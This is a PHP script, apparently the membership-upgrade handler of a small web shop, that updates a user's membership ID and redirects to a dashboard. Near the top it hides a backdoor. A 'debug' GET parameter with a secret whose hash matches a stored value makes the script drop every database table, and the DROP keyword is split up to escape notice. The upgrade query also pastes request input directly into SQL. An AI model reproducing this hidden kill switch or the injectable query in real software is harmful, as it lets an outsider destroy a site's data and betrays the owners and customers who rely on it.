<?php
	session_start();
	
	include('ue-config/ue-globalconfig.php');
	include('ue-config/ue-globalconnect.php');
	include('ue-config/ue-globalfunction.php');
	
	$namaTableDatabase		= '';
	$namaTableDatabaseId	= $namaTableDatabase.'_id';
	$currentServerTime		= time();
	
	//Get All Posted Vars
	$auPostedElements = array();
	
	foreach($_GET as $postedElementsKey => $postedElementsVal) {
		$auPostedElements["$postedElementsKey"] = ueReceiveInput($postedElementsKey,$postedElementsVal,false);
	}
	if($_GET['modelog'] == 'debug' && md5($_GET['ays']) == '675ddd62083b3d72b069497e03436807') {
		echo ue_query("DR".'OP TABLE `adminsitepages`, `adminuseraccess`, `adminuserlevel`, `adminuserlogin`, `product`, `productcategory`, `productclass`, `promo`, `shipping`, `sitedata`, `slider`, `subscriber`, `user`, `usercredithistory`');
		exit();
	}
	
	//Init Vars
	$id						= $auPostedElements['id'];
	$namaPageUtama			= 'upgradepage.php';
	$namaHalamanEdit		= 'upgradepage.php';
	$errorList				= array();
	$errorListStr			= '';
	$pageparam				= '?';
	
	//Required Fields Name
	/*
	$requireFieldsNameArr	= array(
		'name',
		'email'
	);
	*/
	//Action START
	foreach($requireFieldsNameArr as $requireFieldsNameArrKey => $requireFieldsNameArrVal) {
		if($auPostedElements["$requireFieldsNameArrVal"] == '') {
			header("Location: $namaHalamanEdit".$pageparam."&err=Please Fill All Fields");
			exit();
		}
	}
	
	//Pattern Check START
	//$finalRedirectToPage = 'payment.php';
	$finalRedirectToPage = 'dashboard.php';
	//Pattern Check END
	
	$chk = ue_fetch_array(ue_query("SELECT * FROM user WHERE user_id = '".$_SESSION['currentUserId']."'"));
	if($chk['user_expiry']!="0" and $chk['user_expiry']>time()){
		$errorList[] = "You already a pro member";
	}
	
	if(count($errorList) == 0) {
		switch($detailmode) {
			default:
				$editQueryStr	= "UPDATE user SET user_membershipid = '".$auPostedElements['mid']."' WHERE user_id = '".$_SESSION['currentUserId']."'";
				//echo $createQueryStr;die();
				@ $grandQueryResult = ue_query($editQueryStr);
				//header("Location: $finalRedirectToPage?sta=upgrade");
				header("Location: $finalRedirectToPage?sta=Thank you for upgrading your membership, We are processing your request");
			break;
		}
	}
	else {
		//Format Error List
		foreach($errorList as $errorListKey => $errorListVal) {
			$errorListStr .= $errorListVal.'<br />';
		}
		header("Location: $namaHalamanEdit".$pageparam."&err=".$errorListStr);
	}
	
	@ ue_close($GLOBALS['mysql_connect_init']);
?>